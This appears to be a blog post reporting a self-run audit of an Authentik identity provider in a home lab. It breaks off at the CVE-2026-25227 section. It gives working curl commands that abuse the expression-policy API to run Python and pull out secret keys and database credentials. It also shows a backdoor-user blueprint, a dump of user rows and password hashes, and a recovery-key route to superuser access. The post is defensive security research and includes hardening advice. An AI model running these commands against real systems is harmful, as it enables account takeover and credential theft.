---
title: "I Broke My Own Identity Provider"
date: 2026-02-25T12:00:00-05:00
draft: false
author: "Oob Skulden™"
description: "A complete live audit of Authentik 2025.12.3 — every command, every dead end, every lesson. 10 of 15 findings confirmed exploitable including full RCE from a non-superuser account, database compromise, and a two-command path to god-mode. Zero downloaded tools."
tags:
  - "Authentik"
  - "Security Audit"
  - "RCE"
  - "Docker"
  - "CVE-2026-25227"
  - "Container Security"
  - "Secrets Management"
  - "Homelab"
series:
  - "Authentik Identity Provider"
categories:
  - Security Audits
keywords:
  - authentik security audit
  - authentik RCE
  - CVE-2026-25227
  - identity provider security
  - authentik expression policy exploit
  - docker container security audit
  - SSO gateway hardening
  - authentik hardening guide
  - homelab identity provider audit
  - authentik 2025.12.3 vulnerabilities
  - authentik .env secrets management
  - authentik password policy hardening
  - authentik metrics endpoint authentication
  - authentik blueprint API security
showToc: true
tocOpen: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowShareButtons: false
---

<!--
SEO Target Queries:
- authentik security audit
- authentik RCE expression policy
- CVE-2026-25227 authentik exploit
- authentik expression policy code execution
- authentik .env file security
- authentik password policy weak
- authentik metrics endpoint authentication
- authentik blueprint API backdoor
- authentik recovery key god mode
- authentik container security audit
- identity provider security audit homelab
- authentik hardening guide
- authentik docker exec recovery key
- authentik ak_message exfiltration
- authentik postgresql direct access
- authentik CSP missing login page

Featured Snippet Targets:

Q: Can Authentik expression policies execute arbitrary code?
A: Yes. The expression policy API at /api/v3/policies/expression/ accepts arbitrary Python code in the expression field. Any user with an API token and add/change permissions on expression policies can create and execute code on the Authentik server via the /api/v3/policies/all/{uuid}/test/ endpoint, using ak_message() to exfiltrate output.

Q: What is CVE-2026-25227?
A: CVE-2026-25227 is a critical code injection vulnerability in Authentik before 2025.12.4 where users with delegated RBAC permissions (not just superusers) can execute arbitrary Python via expression policy creation and the test endpoint. This enables full remote code execution including secret extraction and database credential theft.

Q: How do I harden Authentik?
A: Lock down the .env file to chmod 600 and chown root:root, move secrets to a vault like OpenBAO, set password policy minimum to 15 characters with HaveIBeenPwned breach checking enabled, deploy a reverse proxy with CSP and HSTS headers, add read_only: true and no-new-privileges to Docker Compose, restrict Docker socket access, and update to 2025.12.4+ to patch CVE-2026-25227.

Q: Is the Authentik .env file a security risk?
A: Yes. The .env file contains the SECRET_KEY and PostgreSQL password in plaintext. If file permissions allow read access (default 664), any user on the system can extract database credentials and directly query PostgreSQL to dump all user accounts, password hashes, and superuser group memberships -- bypassing Authentik entirely with no audit trail.

Q: Can you get admin access to Authentik with Docker exec?
A: Yes. Anyone with Docker socket access can run docker exec authentik-server ak create_recovery_key 10 akadmin to generate a recovery URL that grants full superuser access with no password, no MFA, and no policy evaluation. This is two commands from Docker exec to god-mode.

Q: Does Authentik have a Content Security Policy?
A: No. As of 2025.12.3, the Authentik login page has no Content-Security-Policy header. The page includes inline scripts without nonce attributes, meaning any injected script is indistinguishable from legitimate code. X-Frame-Options (DENY) and X-Content-Type-Options (nosniff) are present, but CSP, HSTS, and Permissions-Policy are missing.
-->

> **Disclaimer:** All testing was performed against infrastructure owned and operated by the author in a private lab environment. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and equivalent laws in other jurisdictions. This content is provided for educational and defensive security research purposes only. Do not test against systems you do not own or have explicit written authorization to test.
>
> This content represents personal educational work conducted in a home lab environment on personal equipment. It does not reflect the views, opinions, or positions of any employer or affiliated organization. All security methodologies are derived from publicly available frameworks, published CVE advisories, and open-source tool documentation. All tools referenced are free, open-source, and publicly available.
{{< ai-walkthrough >}}


Here's a scenario that should keep you up at night. You deploy an identity provider — the single front door to every application in your infrastructure. You configure it once, maybe twice. You trust it. You move on.

Months later, that identity provider is running the same version, with the same default settings, the same **.env** file you generated on day one — now readable by every user on the system. The Docker containers run with writable filesystems. The password policy still accepts `Password1`. And somewhere inside those containers, a Python expression API endpoint is quietly waiting to execute arbitrary code for anyone with an API token.

This is not a theoretical exercise. This is what I found.

I ran a complete live audit of Authentik 2025.12.3 — the open-source identity provider used by thousands of organizations — from a jump box on a separate VLAN, armed with nothing but pre-installed Linux tools. No Burp Suite. No Nuclei. No custom exploits. Just `curl`, `bash`, `python3` standard library, and a healthy dose of paranoia.

The result: 10 out of 15 findings confirmed exploitable, including full Remote Code Execution from a non-superuser account, complete database compromise bypassing the application entirely, and a two-command path from Docker exec to god-mode administrative access. The entire chain — from first reconnaissance to full infrastructure compromise — took under 15 minutes.

What follows is everything. Every command I ran, every dead end I hit, every lesson I learned, and every cleanup step I performed. This is not a sanitized report — it's the raw field notes of what it actually looked like to run a homelab security exercise against my own identity provider, warts and all.

## The Rules of Engagement

Before I get into findings, let me establish the constraint that makes this audit meaningful: I used only pre-installed Linux tools. This is the **zero-download constraint** — a deliberate limitation that simulates a compromised IoT device, a minimal container breakout, or an insider who can't install packages without triggering an alert. If an attacker can't run `apt install` without setting off your EDR, they're stuck with what's already on the machine. That's the threat model.

## The Lab Environment

| System              | IP Address    | Network Segment    |
|---------------------|---------------|--------------------|
| Jump Box (Attacker) | 192.168.50.10 | VLAN 50            |
| Authentik Host      | 192.168.80.54 | VLAN 80 – Identity |

The target ran Authentik 2025.12.3 on Debian 13 (Trixie) with Docker Compose. Three containers: `authentik-server-1`, `authentik-worker-1`, and `authentik-postgresql-1`, plus a proxy outpost for Home Assistant. Only ports 9000 (HTTP) and 9443 (HTTPS) were published externally. Debug and metrics ports (9300, 9900, 9901) were not mapped — a configuration choice that would later prove significant.

## Pre-Audit Reconnaissance

Every audit starts with inventory. I ran `docker ps` on the Authentik host to confirm exactly what I was working with:

```bash
# [authentik-lab host]
sudo docker ps

CONTAINER ID  IMAGE                                       PORTS
0ad259888cf3  ghcr.io/goauthentik/server:2025.12.3        (worker, no ports)
723c63f98ccb  ghcr.io/goauthentik/server:2025.12.3        0.0.0.0:9000->9000, 9443
51f317bd72b2  postgres:16-alpine                          5432/tcp (internal)
542b744f8577  ghcr.io/goauthentik/proxy:2025.12.3         (outpost, no ports)
```

Key observation: only two ports published externally. The debug and metrics ports were locked inside Docker's network. That's good operational hygiene — but as we'll see, it doesn't matter if the attacker can execute code inside the container.

Next, the `.env` file — the crown jewels of any Docker deployment:

```bash
# [authentik-lab host]
cat ~/authentik/.env

PG_PASS=<REDACTED>
AUTHENTIK_SECRET_KEY=<REDACTED>
AUTHENTIK_LOG_LEVEL=info
AUTHENTIK_COOKIE_DOMAIN=192.168.80.54
AUTHENTIK_LISTEN__TRUSTED_PROXY_CIDRS=127.0.0.0/8
```

Two critical observations. First, the `TRUSTED_PROXY_CIDRS` was already restricted to `127.0.0.0/8` — not the default RFC1918 ranges. Someone had hardened this. Second, every secret was sitting in plaintext, and the file permissions were 664 (world-readable). That combination would become the foundation of multiple attack chains.

## The API Token Problem

My first lesson learned came before the audit even started. I created an API token through the Authentik UI — and it failed on POST operations. Silently. No error message, just a 403 that sent me in circles. The fix: create tokens via the Django management shell with explicit `intent='api'`:

```bash
# [authentik-lab host]
sudo docker exec -it authentik-server-1 ak shell -c \
  "from authentik.core.models import Token, User; \
   u=User.objects.get(username='akadmin'); \
   t=Token.objects.create(user=u, identifier='audit-token', intent='api'); \
   print(t.key)"

<REDACTED>
```

Lesson: UI-created tokens may silently fail on write operations. If your automation scripts are getting mysterious 403s, check how the token was created. The `ak shell` method with `intent='api'` is the reliable path.

## F-01: Metrics Endpoint – The Key Was Never Where I Thought

**Severity: HIGH | CVSS: 7.5 | STATUS: CONFIRMED – EXPLOITABLE VIA F-03 RCE CHAIN**

### The Hunt Begins

The original audit documentation claimed the Authentik `SECRET_KEY` doubled as the metrics endpoint password via HTTP Basic Auth. I started there — and immediately hit a wall.

First, I confirmed the metrics endpoint existed:

```bash
# [jump box]
curl -s -o /dev/null -w '%{http_code}' http://192.168.80.54:9000/-/metrics/

401
```

401 — endpoint exists, requires authentication. Next, I checked whether the unauthenticated metrics port (9300) was reachable:

```bash
# [jump box]
(echo >/dev/tcp/192.168.80.54/9300) 2>/dev/null && echo 'OPEN' || echo 'CLOSED'

CLOSED
```

Port 9300 was not published — Docker network isolation doing its job. I also scanned alternate paths and ports. Port 9443 returned 400 (HTTPS on a plain HTTP request), and `/metrics` without the `/-/` prefix returned 404. The only valid metrics path was `/-/metrics/` on port 9000.

### The SECRET_KEY Hypothesis Dies

I exported the `SECRET_KEY` from the `.env` and tried Basic Auth:

```bash
# [jump box]
export SK="<REDACTED>"
curl -s -o /dev/null -w '%{http_code}' -u "monitor:${SK}" \
  http://192.168.80.54:9000/-/metrics/

401
```

Rejected. I verified the key matched the container environment, confirmed it was 81 characters, manually Base64-encoded the credentials, and tried both automatic and manual Authorization headers. All returned 401. Verbose output confirmed the Basic Auth header was being transmitted correctly — the server simply wasn't accepting it.

### Source Code Tells the Real Story

I inspected the monitoring module inside the container:

```python
# [authentik-lab host]
# sudo docker exec authentik-server-1 cat /authentik/root/monitoring.py | head -40

class MetricsView(View):
    def __init__(self, **kwargs):
        _tmp = Path(gettempdir())
        with open(_tmp / "authentik-core-metrics.key") as _f:
            self.monitoring_key = _f.read()

    def get(self, request):
        auth_header = request.META.get("HTTP_AUTHORIZATION", "")
        auth_type, _, given_credentials = auth_header.partition(" ")
        authed = auth_type == "Bearer" and compare_digest(
            given_credentials, self.monitoring_key)
```

There it was. Version 2025.12.3 doesn't use the `SECRET_KEY` for metrics at all. It generates a separate random key stored in a temp file and requires Bearer authentication, not Basic Auth. The documented behavior had diverged from the actual implementation.

I located the key:

```bash
# [authentik-lab host]
sudo docker exec authentik-server-1 find / -name 'authentik-core-metrics.key' 2>/dev/null
/dev/shm/authentik-core-metrics.key

sudo docker exec authentik-server-1 cat /dev/shm/authentik-core-metrics.key
<REDACTED>
```

Confirmed — Bearer auth with the extracted key returned 200.

### Breaking It: RCE Chain to Full Metrics Dump

The metrics key lives inside the container at `/dev/shm/`. You can't reach it from the network. But if you have RCE — and as F-03 demonstrates, you absolutely can — you can read it remotely.

**Step 1:** Use the F-03 expression policy RCE to extract the metrics key without ever touching the container:

```bash
# [jump box]
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"f01-break-metrics",
       "expression":"ak_message(open(\"/dev/shm/authentik-core-metrics.key\").read())"}' \
  http://192.168.80.54:9000/api/v3/policies/expression/

# Execute the policy
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" -d '{"user": 1}' \
  "http://192.168.80.54:9000/api/v3/policies/all/{policy-uuid}/test/"

{"passing":true,"messages":["<REDACTED>"]}
```

Metrics key extracted remotely via RCE — no `docker exec` required.

**Step 2:** Dump the full Prometheus metrics externally:

```bash
# [jump box]
curl -s -H "Authorization: Bearer <REDACTED>" \
  http://192.168.80.54:9000/-/metrics/ | wc -l

1048
```

1,048 lines of Prometheus metrics. I extracted sensitive patterns:

```bash
curl -s -H "Authorization: Bearer <REDACTED>" \
  http://192.168.80.54:9000/-/metrics/ \
  | grep -iE 'login|auth|user|session|token|password|flow'

authentik_enterprise_license_expiry_seconds{...} 0.0
authentik_outposts_connected{expected="1",...} ...
django_http_requests_latency_seconds_by_view_method_sum{
  method="POST",view="authentik_api:propertymapping-test"...}
```

The metrics exposed API endpoint usage patterns — including evidence of my own attack activity (`propertymapping-test`, `policy-test`). I enumerated 30+ unique metric families: database query stats, HTTP request patterns, worker counts, flow caching, policy execution timing, and outpost connectivity.

**Impact:** Full operational visibility into the identity provider. An attacker chaining F-03 RCE to F-01 metrics gains intelligence on which API endpoints are active, how many database queries are executing, worker health, and timing data to inform further attacks.

I cleaned up by deleting the test policy (confirmed with 204 response) and documented the critical lesson: always verify documented behavior against running source code. The vendor documentation lagged behind the actual implementation by at least one version.

## F-02: All Listen Addresses Bind 0.0.0.0 – Saved by Docker

**Severity: HIGH | CVSS: 7.0 | STATUS: DOCKER-MITIGATED – PORTS NOT PUBLISHED**

Every service inside an Authentik container binds to `0.0.0.0` by default. If Docker's port mapping is the only thing standing between those services and the network, that's a single layer of protection on five different ports.

```bash
# [jump box]
for port in 9000 9443 9300 9900 9901; do
  (echo >/dev/tcp/192.168.80.54/$port) 2>/dev/null \
    && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
done

Port 9000: OPEN
Port 9443: OPEN
Port 9300: CLOSED
Port 9900: CLOSED
Port 9901: CLOSED
```

Inside the container, `ss -tlnp` showed no listeners on ports 9300, 9900, or 9901. They weren't just unpublished — they weren't running at all. The architectural risk remains: if an admin enables debug endpoints for troubleshooting and forgets to disable them, they'll bind to all interfaces by default.

## F-03: Expression Policy API – The Road to Full RCE

**Severity: CRITICAL | CVSS: 9.1 | STATUS: CONFIRMED – FULL RCE ACHIEVED**

This is the big one. The finding that turns a compromised API token into full container compromise. And the path to confirming it was anything but straightforward.

### Prove It: Confirming the API Surface

I started by confirming the property mapping and policy APIs were accessible:

```bash
# [jump box]
curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer ${TK}" \
  http://192.168.80.54:9000/api/v3/propertymappings/all/

200
```

I listed all property mappings and found several including my custom OpenBAO Groups mapping. I also discovered that the API schema endpoint at `/api/v3/schema/?format=json` was a goldmine — a machine-readable map of every endpoint including hidden test paths:

```bash
# [jump box]
curl -s -H "Authorization: Bearer ${TK}" \
  "http://192.168.80.54:9000/api/v3/schema/?format=json" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin)
for p in sorted(d.get('paths',{})):
    if 'test' in p: print(p)"

/events/transports/{uuid}/test/
/policies/all/{policy_uuid}/test/
/propertymappings/all/{pm_uuid}/test/
```

Three test endpoints. Each one capable of executing stored code. But finding the right way to exploit them required navigating a minefield of dead ends.

### Break It: Five Dead Ends Before the Breakthrough

We're documenting every failed attempt because this is what real security research looks like. Polished reports hide the debugging; we're showing it.

**Dead End 1:** The test endpoint at `/propertymappings/all/test/` (without UUID) returned 405 Method Not Allowed. The test endpoint requires a specific mapping UUID.

**Dead End 2:** Testing a specific mapping with a user-supplied expression in the POST body — the endpoint evaluated the *stored* expression, not ours. The error message said `File "OpenBAO Groups"` — the stored mapping's name. My injected expression was completely ignored.

**Dead End 3:** I checked OPTIONS to verify the expression field was listed as writable and required. It was. But adding both `name` and `expression` to the POST body still resulted in the stored expression executing. Property mapping test endpoints ignore user-supplied expressions on this version.

**Dead End 4:** Creating new property mappings via POST on scope and SAML subtypes returned 405 on every subtype. The root path `/propertymappings/` returned an HTML 404 — it requires a subtype in the URL.

**Dead End 5:** I tried the expression policy test endpoint at `/policies/expression/{id}/test/` — returned 405. Also tried with `{"user": 1}` — same 405. The path was wrong.

### The Breakthrough

The API schema told me the correct test path: `/policies/all/{uuid}/test/` — not `/policies/expression/{uuid}/test/`. And critically, while property mapping test endpoints ignore user-supplied code, **expression policies accept creation via POST**. You can create a new policy with arbitrary Python, then trigger it through the test endpoint.

I also discovered that all expression policy source code was readable via GET — even without RCE, an attacker could read every authentication flow policy to understand bypass opportunities.

### Confirmed RCE: Four Steps to Secret Extraction

**Step 1:** Create a malicious expression policy:

```bash
# [jump box]
curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"audit-rce-test",
       "expression":"import os\nreturn os.environ.get(\"AUTHENTIK_SECRET_KEY\")"}' \
  http://192.168.80.54:9000/api/v3/policies/expression/

201  # Policy created
```

**Step 2:** Execute via the correct test path. The code ran, but the return value wasn't visible — policy test returns pass/fail, not the return value:

```bash
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" -d '{"user": 1}' \
  "http://192.168.80.54:9000/api/v3/policies/all/{uuid}/test/"

{"passing":true,"messages":[],"log_messages":[]}
# passing: true (SECRET_KEY is truthy), but I can't see it
```

**Step 3:** The exfiltration breakthrough — use `ak_message()` to push data into the messages array:

```bash
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"audit-rce-test2",
       "expression":"import os\nak_message(os.environ.get(\"AUTHENTIK_SECRET_KEY\"))"}' \
  http://192.168.80.54:9000/api/v3/policies/expression/

# Execute and extract:
{"passing":true,"messages":["<REDACTED>"]}
```

**SECRET_KEY extracted remotely via RCE.**

**Step 4:** Extract database credentials. First attempt used `POSTGRES_PASSWORD` — returned "nope". The env var wasn't set. I dumped all DB/PG/PASS environment variables and discovered the actual variable name was `AUTHENTIK_POSTGRESQL__PASSWORD` (double underscore):

```json
{"passing":true,"messages":["{'AUTHENTIK_POSTGRESQL__PASSWORD': '<REDACTED>',
  'AUTHENTIK_POSTGRESQL__HOST': 'postgresql', ...}"]}
```

Full database credentials extracted remotely. Every test policy was cleaned up (all returned 204 on DELETE).

### Key Lessons from F-03

The property mapping test evaluates the stored expression — you cannot override it via POST body. Expression policies accept creation via POST with `name` and `expression` fields. The correct test path is `/policies/all/{uuid}/test/` — not the expression-specific path. `ak_message()` is the exfiltration channel. The `{"user": 1}` parameter is required for policy test execution.

## F-04: Blueprint API Creates Arbitrary Objects

**Severity: HIGH | CVSS: 8.0 | STATUS: CONFIRMED**

Authentik's Blueprint system is infrastructure-as-code for identity management. It can create users, groups, flows, providers — anything. And the API endpoint accepts new blueprints from any authenticated admin.

```bash
# [jump box]
curl -s -w '\n%{http_code}' -H "Authorization: Bearer ${TK}" \
  http://192.168.80.54:9000/api/v3/managed/blueprints/ | head -5

{"pagination":{"count":28,...}}
200  # 28 blueprints listed, all accessible
```

My first attempt at creating a backdoor user blueprint failed with a validation error: "No or invalid identifiers." Blueprint entries require an `identifiers` block separate from `attrs` — a format quirk not obvious from the API documentation.

The corrected format succeeded:

```bash
# [jump box]
curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"name": "audit-backdoor-test", "path": "",
       "content": "version: 1\nmetadata:\n  name: audit-backdoor-test\nentries:\n
         - model: authentik_core.user\n    identifiers:\n
           username: backdoor-admin\n    attrs:\n
           name: Backdoor Admin\n    is_active: true",
       "enabled": false}' \
  http://192.168.80.54:9000/api/v3/managed/blueprints/

201  # Blueprint created (enabled: false for PoC safety)
```

Blueprint created with `enabled: false` as proof of concept. Flipping that to `true` would create the user on the next blueprint sync cycle. Cleanup confirmed with 204.

## F-05: CAPTCHA Stage JavaScript Injection

**Severity: MEDIUM-HIGH | CVSS: 7.2 | STATUS: NOT APPLICABLE**

```bash
# [jump box]
curl -s -H "Authorization: Bearer ${TK}" \
  http://192.168.80.54:9000/api/v3/stages/captcha/ \
  | python3 -c "import sys,json; d=json.load(sys.stdin);
    print(f'CAPTCHA stages: {d[\"pagination\"][\"count\"]}')"

CAPTCHA stages: 0
```

Zero CAPTCHA stages configured. The vulnerability is architecturally valid — CAPTCHA stages accept arbitrary JavaScript — but there's no attack surface on this deployment. Moving on.

## F-06: No Content Security Policy – The Login Page is Naked

**Severity: MEDIUM-HIGH | CVSS: 6.5 | STATUS: PARTIALLY CONFIRMED**

I inspected security headers on the login page:

```bash
# [jump box]
curl -sI http://192.168.80.54:9000/if/flow/default-authentication-flow/ \
  | grep -iE 'content-security|x-frame|x-content-type|strict-transport|permissions-policy'

X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

| Header                    | Status                   |
|---------------------------|--------------------------|
| Content-Security-Policy   | **MISSING**              |
| Strict-Transport-Security | **MISSING**              |
| Permissions-Policy        | **MISSING**              |
| X-Frame-Options           | **PRESENT (DENY)**       |
| X-Content-Type-Options    | **PRESENT (nosniff)**    |

Version delta: X-Frame-Options and X-Content-Type-Options are now present natively in 2025.12.3 — an improvement over earlier versions. But CSP, HSTS, and Permissions-Policy remain absent.

I confirmed the login page uses three inline scripts with no nonce attributes, plus two module scripts. Without CSP, there is no allowlist — any injected script is indistinguishable from legitimate ones. I extracted the inline config object:

```javascript
window.authentik = {
  locale: "en",
  config: JSON.parse('{"error_reporting": {"enabled": false,
    "sentry_dsn": "https://..."},
    "capabilities": ["can_impersonate", ...]}'),
  brand: JSON.parse('{"flow_authentication": "default-authentication-flow", ...}'),
  api: { base: "http://192.168.80.54:9000/" }
};
```

This exposes the API base URL, Sentry DSN, capability flags (including `can_impersonate`), authentication flow names, and version information. I generated a credential-harvesting PoC that would attach input event listeners to password fields and exfiltrate keystrokes via image pixel requests — a classic technique that is indistinguishable from legitimate inline scripts without CSP protection. The PoC also exfiltrated the `window.authentik` config object for immediate reconnaissance.

**Impact:** The login page — the highest-value XSS target in the entire infrastructure — has zero browser-side script restrictions. Any injection vector (F-05 CAPTCHA stage, stored XSS in user attributes, custom CSS) executes unrestricted. CSP with a nonce-based policy would block all of this.

## F-07: The .env File – Skeleton Key to Everything

**Severity: HIGH | CVSS: 8.0 | STATUS: CONFIRMED**

This finding is the foundation of two critical attack chains. One file, readable by any user on the system, containing everything an attacker needs.

```bash
# [jump box]
curl -s -H "Authorization: Bearer ${TK}" \
  "http://192.168.80.54:9000/api/v3/core/users/?username=akadmin" \
  | python3 -c "import sys,json; d=json.load(sys.stdin);
    print(f'akadmin active: {d[\"results\"][0][\"is_active\"]}')"

akadmin active: True

# [authentik-lab host]
stat -c '%a %U:%G' ~/authentik/.env

664 oob:oob  # world-readable, not root-owned
```

The akadmin super-user is active. The `.env` file is 664 (world-readable) — worse than expected. Both the `SECRET_KEY` and `PG_PASS` sit in plaintext.

### Breaking It: .env to Database God-Mode

**Step 1:** Extract credentials:

```bash
# [authentik-lab host]
grep -E 'SECRET|PASS' ~/authentik/.env

PG_PASS=<REDACTED>
AUTHENTIK_SECRET_KEY=<REDACTED>
```

**Step 2:** Use the DB password to dump all user accounts:

```bash
# [authentik-lab host]
sudo docker exec authentik-postgresql-1 psql -U authentik -d authentik \
  -c "SELECT id, username, is_active, email, name FROM authentik_core_user;"

 id | username      | is_active | email            | name
----+---------------+-----------+------------------+-------------------
  1 | AnonymousUser | t         |                  |
  6 | akadmin       | t         | admin@lab.local  | authentik Default
 11 | oob           | t         |                  | Oob Skulden
  9 | jack          | t         | jack@lab.local   | Jack N
  7 | dingo         | t         | dingo@lab.local  | Testuser
 10 | sam           | t         | sam@lab.local    | Sam Elliot
  8 | hugh          | f         | hugh@lab.local   | Hugh Jackman
(9 rows)
```

Full user table: 9 accounts including service accounts, with emails and active status.

**Step 3:** Extract password hashes for offline cracking:

```bash
sudo docker exec authentik-postgresql-1 psql -U authentik -d authentik \
  -c "SELECT id, username, password FROM authentik_core_user
      WHERE username IN ('akadmin','oob');"

 id | username | password
----+----------+----------------------------------------------
 11 | oob      | pbkdf2_sha256$1000000$<REDACTED>
  6 | akadmin  | pbkdf2_sha256$1000000$<REDACTED>
```

PBKDF2-SHA256 password hashes with 1,000,000 iterations. Ready for offline cracking with hashcat or john.

**Step 4:** Map superuser group membership. This required its own troubleshooting — the initial query used `is_superuser` on the user table, but that column doesn't exist in 2025.12.3. Authentik stores superuser status on the group, not the user. I also hit a schema issue: the group table uses `group_uuid` as its primary key, not `uuid`. After inspecting the schema with `\d authentik_core_group`:

```bash
sudo docker exec authentik-postgresql-1 psql -U authentik -d authentik \
  -c "SELECT u.username, g.name, g.is_superuser
      FROM authentik_core_user u
      JOIN authentik_core_group_users gu ON u.id = gu.user_id
      JOIN authentik_core_group g ON gu.group_id = g.group_uuid
      WHERE g.is_superuser = true;"

 username | name             | is_superuser
----------+------------------+--------------
 akadmin  | authentik Admins | t
```

**Impact:** From a single file read to complete database compromise: user table, password hashes, superuser mapping. The attacker bypasses Authentik entirely — no API token, no authentication flow, no audit trail in Authentik logs. This is invisible to the application.

## F-08: Trusted Proxy CIDRs – Already Hardened

**Severity: MEDIUM-HIGH | CVSS: 7.0 | STATUS: ALREADY HARDENED**

```bash
# [jump box]
curl -s -H 'X-Forwarded-For: 1.2.3.4' \
  http://192.168.80.54:9000/if/flow/default-authentication-flow/ \
  -o /dev/null -w '%{http_code}'

200
```

I checked the server logs:

```bash
# [authentik-lab host]
sudo docker logs authentik-server-1 2>&1 | tail -20 | grep -iE 'forward|remote|client'

"remote": "192.168.50.10"  # Real IP, NOT the spoofed 1.2.3.4
```

The `TRUSTED_PROXY_CIDRS` was already restricted to `127.0.0.0/8`. The spoofed `X-Forwarded-For` was correctly ignored and Authentik logged the real source IP. This finding is not exploitable on this deployment. Someone did their homework.

## F-09: Password Policy – The SSO Gateway Accepts Password1

**Severity: MEDIUM | CVSS: 5.5 | STATUS: CONFIRMED**

```bash
# [jump box]
curl -s -H "Authorization: Bearer ${TK}" \
  http://192.168.80.54:9000/api/v3/policies/password/ \
  | python3 -c "
import sys,json
for p in json.load(sys.stdin)['results']:
    print(f'Min length: {p.get(\"length_min\",\"?\")}'
          f'  HIBP: {p.get(\"check_have_i_been_pwned\",\"?\")}'
          f'  zxcvbn: {p.get(\"check_zxcvbn\",\"?\")}')"

Min length: 8  HIBP: False  zxcvbn: True
```

The zxcvbn pattern detection is a positive. But 8-character minimum and no HaveIBeenPwned breach database checking? For the single front door to every application? I tested it:

```bash
# [jump box]
# Create test user
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"username":"f09-weak-pw-test","name":"F09 Test",
       "path":"users","type":"internal"}' \
  http://192.168.80.54:9000/api/v3/core/users/

# Set weak password
curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"password":"Password1"}' \
  "http://192.168.80.54:9000/api/v3/core/users/16/set_password/"

204  # Accepted!
```

`Password1` accepted. Then I tested four more from the top 100 breached passwords list:

```bash
for pw in 'admin123' '12345678' 'qwerty12' 'letmein1'; do
  curl -s -o /dev/null -w "Password '${pw}': %{http_code}\n" -X POST \
    -H "Authorization: Bearer ${TK}" -H "Content-Type: application/json" \
    -d "{\"password\":\"${pw}\"}" \
    "http://192.168.80.54:9000/api/v3/core/users/16/set_password/"
done

Password 'admin123': 204
Password '12345678': 204
Password 'qwerty12': 204
Password 'letmein1': 204
```

All accepted. Every single one appears in common breach databases. The SSO gateway that protects Grafana, OpenBAO, and every downstream application will happily accept `letmein1` as a valid password. Test user cleaned up (204).

## F-10: Container Security – Writable Filesystem + World-Accessible IPC

**Severity: MEDIUM | CVSS: 6.0 | STATUS: CONFIRMED**

I ran a comprehensive check of the container's security posture:

```bash
# [authentik-lab host]
docker inspect authentik-server-1 --format '{{.HostConfig.SecurityOpt}}'
[]  # No security options

sudo docker exec authentik-server-1 cat /proc/1/status | grep CapEff
CapEff: 0000000000000000  # Zero effective capabilities

sudo docker exec authentik-server-1 whoami
authentik  # Non-root user (good!)

docker inspect authentik-server-1 --format '{{.HostConfig.ReadonlyRootfs}}'
false  # Writable filesystem (bad)

sudo docker exec authentik-server-1 sh -c \
  'echo test > /tmp/write_test && echo "WRITABLE" && rm /tmp/write_test'
WRITABLE
```

Positive finding: the container runs as the `authentik` user with zero effective capabilities. This limits blast radius compared to a root container. But no `no-new-privileges` flag, writable filesystem, and the IPC socket at `/dev/shm/authentik-core.sock` is world-accessible (`srwxrwxrwx`).

I proved the impact by chaining F-03 RCE to write files remotely and extract IPC keys — all from the jump box without container exec access:

```bash
# [jump box] -- Remote file write via RCE
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"f10-break-ipc",
       "expression":"import os\nos.system(\"echo backdoor > /tmp/f10-persist.sh\")\n
       ak_message(open(\"/dev/shm/authentik-core-ipc.key\").read())"}' \
  http://192.168.80.54:9000/api/v3/policies/expression/

# Execute: IPC key extracted, file written remotely
{"passing":true,"messages":["<REDACTED>"]}

# [authentik-lab host] -- Verify the remote file write
sudo docker exec authentik-server-1 cat /tmp/f10-persist.sh
backdoor
```

File written to the container filesystem remotely via RCE. No `docker exec` required. A read-only filesystem with `no-new-privileges` would have prevented both the persistence and the IPC key extraction. Cleanup: policy deleted (204), file removed.

## F-11: Trace Logging – Properly Configured

**Severity: MEDIUM | CVSS: 6.5 | STATUS: NOT EXPLOITABLE**

```bash
# [authentik-lab host]
sudo docker exec authentik-server-1 env | grep LOG_LEVEL
AUTHENTIK_LOG_LEVEL=info
```

Log level is `info`. Session cookies are not being logged. The risk is architectural — trace logging can be enabled and would leak session cookies — but it's not currently active.

## F-12: Recovery Key via Container Exec – Two Commands to God-Mode

**Severity: HIGH | CVSS: 8.5 | STATUS: CONFIRMED – FULL BYPASS ACHIEVED**

This is the finding that makes sysadmins uncomfortable. If you have Docker socket access — and on many deployments, the application user does — you are two commands away from full super-user access with no password, no MFA, and no policy evaluation.

```bash
# [authentik-lab host]
ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Feb 28 18:56 /var/run/docker.sock

getent group docker
docker:x:989:oob  # oob is in the docker group
```

No sudo needed. Generate the recovery key and use it:

```bash
# [authentik-lab host]
docker exec authentik-server-1 ak create_recovery_key 10 akadmin

Store this link safely, as it will allow anyone to access authentik as akadmin.
This recovery token is valid for 10 minutes.
/recovery/use-token/<REDACTED>/

# [jump box] -- Use the recovery token
curl -s -o /dev/null -w '%{http_code}' -c /tmp/ak_cookies -L \
  "http://192.168.80.54:9000/recovery/use-token/<REDACTED>/"
200

# Verify super-user session
curl -s -b /tmp/ak_cookies http://192.168.80.54:9000/api/v3/core/users/me/ \
  | python3 -c "import sys,json; d=json.load(sys.stdin);
    print(f'User: {d[\"user\"][\"username\"]} | Superuser: {d[\"user\"][\"is_superuser\"]}')"

User: akadmin | Superuser: True
```

Full super-user access. No password. No MFA. No policy evaluation. Two commands from Docker exec to god-mode.

## CVE-01: CVE-2026-25227 – RCE via Delegated View Permissions

**Severity: CRITICAL | CVSS: 9.1 | STATUS: CONFIRMED – FULL RCE WITH NON-SUPERUSER**

